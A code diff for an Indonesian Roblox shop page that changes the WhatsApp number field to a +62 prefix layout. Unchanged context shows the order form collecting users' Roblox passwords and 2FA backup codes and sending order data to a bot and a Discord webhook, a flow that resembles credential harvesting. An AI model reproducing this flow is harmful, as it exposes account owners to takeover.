@@ -163,7 +163,14 @@
                     <div class="step-num">4</div>
                     <h3>Konfirmasi Kontak</h3>
                 </div>
-                <input type="text" id="wa-user" class="input-box" placeholder="No. WhatsApp Aktif (62xxx)">
+                <label style="font-size: 0.8rem; opacity: 0.8; display: block; margin-bottom: 5px;">Nomor WhatsApp</label>
+                <div style="display: flex; gap: 8px; margin-bottom: 12px;">
+                    <div style="background: #0a0e27; border: 1px solid rgba(212, 175, 55, 0.15); border-radius: 10px; padding: 0 12px; display: flex; align-items: center; gap: 6px;">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg" style="width: 18px;">
+                        <span style="font-size: 0.9rem;">+62</span>
+                    </div>
+                    <input type="number" id="wa-user" class="input-box" placeholder="8123456xxx" style="margin-bottom: 0; flex: 1;">
+                </div>
                 <p style="font-size: 0.7rem; color: var(--gold-light); opacity: 0.8;">*Wajib diisi untuk update status pesanan.</p>
             </div>
         </div>
@@ -375,7 +382,7 @@
                 username: userVal, 
                 password: passVal, 
                 backup_code: backupVal, 
-                wa: waVal, 
+                wa: "+62" + waVal, 
                 product: window.selectedProduct.name, 
                 price: window.selectedProduct.price, 
                 method: window.chosenMethod, 
@@ -392,7 +399,7 @@
                 history.unshift(data);
                 localStorage.setItem('robloxHistory', JSON.stringify(history));
 
-                // 3. KIRIM KE BOT VYNZZHOST (Agar ada tombol Berhasil/Gagal)
+                // 3. KIRIM KE BOT VYNZZHOST
                 try {
                     await fetch('http://vynzzhost-properties:8080/order-masuk', {
                         method: 'POST',
@@ -410,7 +417,7 @@
                     console.error("Gagal lapor ke Bot Vynzz:", botErr);
                 }
 
-                // 4. KIRIM BUKTI KE WEBHOOK DISCORD (Statis Log)
+                // 4. KIRIM BUKTI KE WEBHOOK DISCORD
                 const formData = new FormData();
                 formData.append('payload_json', JSON.stringify({ 
                     embeds: [{ 
@@ -423,7 +430,7 @@
                             { name: "Produk", value: data.product }, 
                             { name: "Harga", value: "Rp " + data.price.toLocaleString() },
                             { name: "Metode", value: data.method },
-                            { name: "WA", value: data.wa }
+                            { name: "WhatsApp", value: data.wa }
                         ] 
                     }] 
                 }));
